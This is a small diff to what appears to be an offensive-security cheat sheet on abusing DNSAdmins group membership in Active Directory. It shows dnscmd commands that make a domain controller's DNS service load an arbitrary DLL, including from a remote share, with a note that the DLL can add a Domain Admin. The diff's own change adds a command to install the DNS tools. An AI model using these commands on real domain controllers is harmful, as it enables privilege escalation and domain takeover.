@@ -172,6 +172,9 @@ Members can make the DNS server load an arbitrary DLL (either locally or from a 
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
 dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
 An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
+
+# If dnscmd is not installed run from aprivileged PowerShell session:
+Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
 ```
 
 ```c
